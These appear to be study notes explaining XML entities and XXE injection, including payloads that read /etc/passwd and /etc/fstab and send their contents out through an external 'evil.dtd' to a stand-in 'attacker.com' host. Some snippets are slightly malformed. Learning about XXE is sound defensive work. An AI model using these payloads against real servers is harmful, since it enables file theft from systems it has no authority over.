# XML External Entities

XML is about data transportation and sometimes storage

Use in API, UIs, config files and RSS feeds.

``` xml
<?xml version="1.0"?> <!-- xml metadata-->
<Person>
<Name>John</Name>
<Age>20</Age>
</Person>
```

Tag names are case sensitive
`<>"'` are not allowed in the document directly because XML parsers will have trouble interpreting it correctly

## Entities

**Entities** are like variables for XML. You can assign a value to it an use it multiple times in the document. They are are declared in **Document Type Defintion (DTD)**

``` xml
<!DOCTYPE Person [
    <!ENTITY name "John">
]>
<Person>
    <Name>&name;</Name>
    <Age>20</Age>
</Person>
```

There are many types of entities

* internal - defined within local DTD.

    ``` dtd
    <!DOCTYPE doc [
        <!ENTITY foo "bar">
    ]>
    ```

    Can be referred to within the XML as `&foo;` and will be replaced with the term "bar"
* external - defined outside of local DTD

    ``` dtd
    <!ENTITY foo SYSTEM "file:///external.dtd">
    ```

* parameter - only allowed inside DTD. Is used with the `%` symbol  
E.g. creating an entity whose value is another entity

    ``` xml
    <!DOCTYPE Person [
        <!ENTITY % outer "<!ENTITY inner 'John'>">
    ]>
    ```

* predefined - a set of predefined values of special characters

    ``` xml
    <hello>&#x3C;</hello>
    ```

## Exploitations

Entities can

* store values we specify
* pull values from a local files
* fetch remote data over the network and store them as entities

Here is an example of extracting contents from local files:

``` xml
<?xml version="1.0"?>
<!DOCTYPE XXE [
    <!ENTITY subscribe SYSTEM "secret.txt">
    <!-- SYSTEM lets the entity know the XML parser know that the entity is external -->
    <!-- It stores the contents of "secret.txt" into subscribe -->
]>
<pwn>&subscribe;</pwn>
```

There are different types of XXE's; inband, error, out-of-band (OOB)

* inband - the XML will be parsed and the output will be shown on the screen
* error - a blink XXE, where you basically see a bunch of errors
* OOB - xml is parsed, but you can't see the output. You would need to do some sort of out of band request to exfiltrate data.

    ``` xml
    <?xml version="1.0"?>
    <!DOCTYPE XXE [
    <!ENTITY SYSTEM "http://attacker.com:1337">
    ]>
    <data>&send;</data>
    ```

    If we can see the request to `http://attacker.com/1337` we know we can use an external entities

### External Document Type Definitions

Notice that DTDs aren't actually part of the XML data and are declared outside of it. DTDs can be loaded externally just like entities

``` xml
<?xml version="1.0"?>
<!DOCTYPE Pwn [
<!ENTITY % parameter_entity "<!ENTITY general_entity 'PwnFunction'">
%parameter_entity;
]>
<pwn>&general_entity;</pwn>

<!-- This is parsed and interpreted as -->
<?xml version="1.0"?>
<!DOCTYPE Pwn [
<!ENTITY % parameter_entity "<!ENTITY general_entity 'PwnFunction'>">
<!ENTITY general_entity 'PwnFunction'>
]>
<pwn>&general_entity;</pwn>
```

We can't use parameter entities within the markup declaration, but we can use it in the same level as the markup definition. So in the XML snippet below:

* we **CAN'T** use `passwd` parameter in the wrapper parameter
* we **CAN** use the `wrapper` parameter

``` xml
<?xml version="1.0"?>
<!DOCTYPE XXE [
<!ENTITY % passwd SYSTEM "/etc/passwd">
<!ENTITY % wrapper SYSTEM "<!ENTITY send SYSTEM 'http://attacker.com/?%passwd;'>">
<!ENTITY send SYSTEM 'http://attacker.com/?CONTENTS_OF_PASSWD'>
]>
<pwn>&send;</pwn>
```

Instead, we would have to use external DTDs

``` xml
<!-- main.xml -->
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
<data>&send;</data>
```

``` xml
<!-- evil.dtd -->
<!ENTITY % passwd SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?%passwd;'>">
%wrapper;

<!-- This is interpreted as
<!ENTITY % passwd SYSTEM "file:///etc/passwd">
<!ENTITY %wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?%passwd;'>">
<!ENTITY send SYSTEM 'http://attacker.com/?CONTENTS_OF_PASSWD>
-->
```

If a file contains non "well-formed" tags, e.g. `<p></p>`, they need to be enclosed with CDATA. Whatever is in between the opening and closing CDATA is will not be parsed as markup by the XML parser. e.g `<text>` is ignored in `<![CDATA[ <text> ]]>`.

The value of a CDATA entity has to be well-formed so we cannot do the following

``` xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY start "<![CDATA[">
<!ENTITY file SYSTEM "file:///etc/fstab">
<!ENTITY end "]]">
]>
<data>&start;&file;&end;</data>
```

The solution to this is using parameter entities and external DTDs

``` xml
<!-- external.dtd -->
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % end "]]">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>"
%wrapper;
```

For more possible XXE payloads see [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
